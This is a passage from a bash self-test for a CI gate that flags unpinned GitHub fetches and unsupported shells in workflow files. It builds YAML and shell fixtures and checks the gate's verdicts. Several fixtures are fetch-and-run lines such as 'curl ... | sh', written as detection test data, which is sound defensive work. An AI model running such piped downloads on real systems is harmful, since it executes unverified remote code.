  [[ $rc == 1 ]] && grep -qF "action.yml:5:" <<<"$o" && grep -qF "mutable GitHub ref" <<<"$o"; check "actions dir: an unpinned fetch in a composite action fails naming action.yml:5" $?
}
composite_action_case
bash "$GATE" "$T/act_ok/workflows" >/dev/null 2>&1; check "actions dir: a pinned composite action passes" $?
mk sh_pwsh <<EOF2
jobs:
  j:
    steps:
      - name: x
        shell: pwsh
        run: echo hi
EOF2
bad sh_pwsh 6 "unsupported shell, cannot verify"
mk sh_python_after <<EOF2
jobs:
  j:
    steps:
      - run: echo hi
        shell: python
EOF2
bad sh_python_after 4 "unsupported shell, cannot verify"
mk sh_expr <<'EOF2'
jobs:
  j:
    steps:
      - shell: ${{ matrix.shell }}
        run: echo hi
EOF2
bad sh_expr 5 "unsupported shell, cannot verify"
mk sh_defaults <<EOF2
defaults:
  run:
    shell: pwsh
jobs:
  j:
    steps:
      - run: echo hi
EOF2
bad sh_defaults 3 "unsupported shell, cannot verify"
mk sh_bash_ok <<EOF2
defaults:
  run:
    shell: bash
jobs:
  j:
    steps:
      - shell: bash -e {0}
        run: echo hi
      - shell: sh
        run: echo hi
EOF2
good sh_bash_ok

# ============ PS-A4: one fixture per rule/branch/table cell that the mutation run showed was not pinned ============
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one rule: removing the rule must turn it red)
RAW=https://raw.githubusercontent.com/o/r/main/i.sh
for spec in \
  "r3_echo_mention|echo curl $E | sh" \
  "r3_hash_mention|hash curl $E | sh" \
  "r3_apt_mention|apt install curl $E | sh" \
  "r3_aptget_mention|apt-get install curl $E | sh" \
  "r3_post_raw_X|curl -sf -X POST -d x $RAW" \
  "r3_post_raw_request|curl -sf --request PUT $RAW" \
  "r3_post_raw_d|curl -sf -d x $RAW" \
  "r3_post_raw_T|curl -sf -T f $RAW" \
  "r3_post_wget|wget -qO- --post-data=x $RAW" \
  "r3_devnull_redir|curl -sf $RAW >/dev/null" \
  "r3_head_I|curl -sfI $RAW" \
  "r3_head_pipe_inert|curl -sSf $E | head -n 1" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r3_echo_mention r3_hash_mention r3_apt_mention r3_aptget_mention r3_post_raw_X r3_post_raw_request r3_post_raw_d r3_post_raw_T r3_post_wget r3_devnull_redir r3_head_I r3_head_pipe_inert; do good "$c"; done
for spec in \
  "r3_get_raw|curl -sf -X GET $RAW|mutable GitHub ref" \
  "r3_stderr_null|curl -sf $RAW 2>/dev/null|mutable GitHub ref" \
  "r3_stderr_null_sp|curl -sf $RAW 2> /dev/null|mutable GitHub ref" \
  "r3_url_opt|curl -sSf --url $E | sh|consumed in-stream" \
  "r3_dollar_beside_pinned|curl -sSfL \"\$U\" https://raw.githubusercontent.com/o/r/$SHA/i.sh | sh|cannot verify" \
  "r3_codeload_kind|curl -sSfL -o a.tgz https://codeload.github.com/o/r/foo/$SHA|unrecognised GitHub URL shape" \
  "r3_codeload_noref|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz|unrecognised GitHub URL shape" \
  "r3_api_orgs|curl -sSfL -o a.tgz https://api.github.com/orgs/o/x/tarball/$SHA|unrecognised GitHub URL shape" \
  "r3_api_blobs|curl -sSfL -o a.json https://api.github.com/repos/o/r/git/blobs/$SHA|unrecognised GitHub URL shape" \
  "r3_sum_word_x|curl -sSfL -o a $E && sha256sum a x|no checksum verification in the step" ; do
  fixture "${spec%%|*}" "$(cut -d'|' -f2- <<<"$spec" | sed 's/|[^|]*$//')"
  bad "${spec%%|*}" 5 "${spec##*|}"
done
fixture r3_unknown_first_word "5 echo curl $E | sh"; bad r3_unknown_first_word 5 "consumed in-stream"

# MISSING TEST 1: an awk that fails must exit 3 with the message, never green
awk_failure_case() {
  local o rc
  mkdir -p "$T/stubbin"; printf '#!/bin/sh\necho "awk: simulated failure" >&2\nexit 2\n' > "$T/stubbin/awk"; chmod +x "$T/stubbin/awk"
  o="$(PATH="$T/stubbin:$PATH" bash "$GATE" "$REAL" 2>&1)"; rc=$?
  [[ $rc == 3 ]] && grep -qF "INTERNAL ERROR -- no summary produced" <<<"$o"; check "a failing awk exits 3 with the internal-error message" $?
}
awk_failure_case
rm -rf "$T/stubbin"

# MISSING TEST 2: the loop-run cases must cover the fixtures declared (counted from the directories, not the loop)
coverage_guard() {
  local ndirs; ndirs="$(find "$T" -mindepth 1 -maxdepth 1 -type d | wc -l | tr -d ' ')"
  if (( n < ndirs || n == 0 )); then echo "FAIL: ran $n case(s) for $ndirs fixture dir(s): a loop ran zero or too few cases" >&2; fail=$((fail+1)); fi
}
coverage_guard

if (( fail )); then echo "template-workflow-pins selftest: $fail FAILED of $n case(s)" >&2; exit 1; fi
echo "template-workflow-pins selftest: ok -- $n case(s)"
